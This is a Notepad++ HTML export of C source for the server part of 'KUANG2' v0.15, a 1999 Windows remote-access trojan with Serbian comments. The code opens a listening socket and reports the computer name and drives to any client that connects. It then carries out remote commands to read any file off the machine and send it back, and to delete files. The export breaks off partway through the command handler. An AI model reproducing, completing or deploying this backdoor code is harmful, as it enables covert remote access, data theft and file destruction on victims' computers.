<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/***[ThuNderSoft]*************************************************************
                                 KUANG2: server
                                   ver: 0.15
                                ˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/</span><span class="sc0">

</span><span class="sc1">/* HISTORY */</span><span class="sc0">
</span><span class="sc2">// ver 0.15 (06-may-1999): konaÅan oblik
// ver 0.10 (30-mar-1999): born code
</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;
#include &lt;win95e.h&gt;
#include &lt;strmem.h&gt;
#include "kuang2.h"
</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Kuang2_class</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">ServerThread</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temppath</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">listen_socket</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
    StartServer
    -----------
  ˛ PoÅetak rada servera. Kreira se socket, postavlja se asinhrono
    obaveÑtavanje i ukljuÅuje se listen mod */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">StartServer</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">W</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SOCKADDR_IN</span><span class="sc0"> </span><span class="sc11">sa_server</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// zahteva se winsock v1.1
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAStartup</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0x101</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">W</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// obriÑi request listu
</span><span class="sc0">    </span><span class="sc11">ClearRequests</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc2">// kreiraj stream socket
</span><span class="sc0">    </span><span class="sc11">listen_socket</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">==</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// postavi asinhrono obaveÑtavanje
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAAsyncSelect</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UM_ASYNC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FD_ACCEPT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// popuni strukturu
</span><span class="sc0">    </span><span class="sc11">sa_server</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc10">=</span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// Internet familija
</span><span class="sc0">    </span><span class="sc11">sa_server</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">=</span><span class="sc11">INADDR_ANY</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// sve adrese
</span><span class="sc0">    </span><span class="sc11">sa_server</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">=</span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">KUANG2_PORT</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">// port
</span><span class="sc0">
    </span><span class="sc2">// bindovanje
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">sa_server</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sa_server</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// namesti socket u listen mod
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAXCONN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
    OnAccept
    --------
  ˛ dobijena je asinhrona poruka za prijem konekcije */</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnAccept</span><span class="sc10">(</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SOCKADDR_IN</span><span class="sc0"> </span><span class="sc11">sock_addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">peer_socket</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ThreadID</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nlen</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// prihvata se konekcija
</span><span class="sc0">    </span><span class="sc11">nlen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sock_addr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">peer_socket</span><span class="sc10">=</span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">listen_socket</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">sock_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nlen</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">peer_socket</span><span class="sc10">==</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// preuzmi novi request
</span><span class="sc0">    </span><span class="sc11">nlen</span><span class="sc10">=</span><span class="sc11">NewRequest</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nlen</span><span class="sc10">==</span><span class="sc11">NOMOREREQUEST</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">          </span><span class="sc2">// ima previÑe konektovanih klijenata
</span><span class="sc0">        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">peer_socket</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">err</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">peer_socket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// zapamti socket
</span><span class="sc0">    </span><span class="sc11">request</span><span class="sc10">[</span><span class="sc11">nlen</span><span class="sc10">].</span><span class="sc11">socket</span><span class="sc10">=</span><span class="sc11">peer_socket</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// startuj thread i zapamti handle na njega
</span><span class="sc0">    </span><span class="sc11">request</span><span class="sc10">[</span><span class="sc11">nlen</span><span class="sc10">].</span><span class="sc11">thread</span><span class="sc10">=</span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ServerThread</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;(</span><span class="sc11">request</span><span class="sc10">[</span><span class="sc11">nlen</span><span class="sc10">].</span><span class="sc11">socket</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ThreadID</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
    OnQuitclient
    ------------
  ˛ dobijena je poruka za zavrÑavanje klijenta */</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnQuitclient</span><span class="sc10">(</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// preuzmi index u Request listi trenutne konekcije
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">GetRequest</span><span class="sc10">(</span><span class="sc11">socket</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">==</span><span class="sc11">BADREQUEST</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// zatvori socket
</span><span class="sc0">    </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">socket</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// zatvori thread
</span><span class="sc0">    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">request</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">thread</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// obriÑi zauzeto polje u Request listi
</span><span class="sc0">    </span><span class="sc11">request</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">socket</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
    ServerThread
    ------------
  ˛ Svaka konekcija koja se zakaÅi na server koristi ovaj thread. */</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">ServerThread</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">targ</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">BUFFER_SIZE</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">pMessage</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pMessage</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">msgsock</span><span class="sc10">=*(</span><span class="sc11">SOCKET</span><span class="sc10">*)</span><span class="sc11">targ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bytes_recieved</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define     bytes_sent      bytes_recieved
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fajlsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tosend</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define     downloaded      tosend
</span><span class="sc0">    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fajl</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filelist</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">fajlsize</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// ovo je kulturan server - Ñalje pozdravnu poruku pri konekciji
</span><span class="sc0">    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_HELO</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc2">// komanda prepoznavanja
</span><span class="sc0">    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">param</span><span class="sc10">=</span><span class="sc11">drives</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc2">// informacije o fixnim diskovima
</span><span class="sc0">    </span><span class="sc11">temp</span><span class="sc10">=</span><span class="sc11">BUFFER_SIZE</span><span class="sc10">-</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">GetComputerName</span><span class="sc10">(&amp;(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">sdata</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// ime kompjutera na kome je server
</span><span class="sc0">    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFFER_SIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// petlja servera: prima poruke klijenta i odgovara na njih
</span><span class="sc0">    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc2">// primi poruku
</span><span class="sc0">        </span><span class="sc11">bytes_recieved</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFFER_SIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// prihvati poruku od klijenta
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">bytes_recieved</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_QUIT</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// ako je klijent otiÑao
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bytes_recieved</span><span class="sc10">==</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                   </span><span class="sc2">// ako je nastupila greÑka
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAGetLastError</span><span class="sc10">()!=</span><span class="sc11">WSAEWOULDBLOCK</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_QUIT</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// i to fatalna
</span><span class="sc0">                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">                                  </span><span class="sc2">// ne fatalna greÑka - wsaewouldblock
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// parse commands
</span><span class="sc0">        </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_DOWNLOAD_FILE</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc2">// faza #3 - zatvori handle i javi da je OK
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">param</span><span class="sc10">==</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fajlsize</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc2">// faza #2 - zapoÅinje burst prenos fajla
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">param</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fajlsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">tosend</span><span class="sc10">=</span><span class="sc11">BUFFER_SIZE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tosend</span><span class="sc10">&gt;</span><span class="sc11">fajlsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">tosend</span><span class="sc10">=</span><span class="sc11">fajlsize</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">fajlsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_END</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tosend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">bytes_sent</span><span class="sc10">=</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tosend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// poÑalji 1KB fajla
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bytes_sent</span><span class="sc10">==</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAGetLastError</span><span class="sc10">()!=</span><span class="sc11">WSAEWOULDBLOCK</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">bytes_sent</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">fajlsize</span><span class="sc10">-=(</span><span class="sc11">bytes_sent</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc2">// faza #1 - inicijalizacija downloada
</span><span class="sc0">                </span><span class="sc11">fajl</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">bdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fajlsize</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fajlsize</span><span class="sc10">==</span><span class="sc4">0xFFFFFFFF</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// neka greÑka pri radu sa fajlom
</span><span class="sc0">                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// fajl spreman za download
</span><span class="sc0">                </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">param</span><span class="sc10">=</span><span class="sc11">fajlsize</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// veliÅina fajla
</span><span class="sc0">                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_QUIT</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc11">SendMessage</span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UM_QUITCLIENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WPARAM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_DELETE_FILE</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">bdata</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">
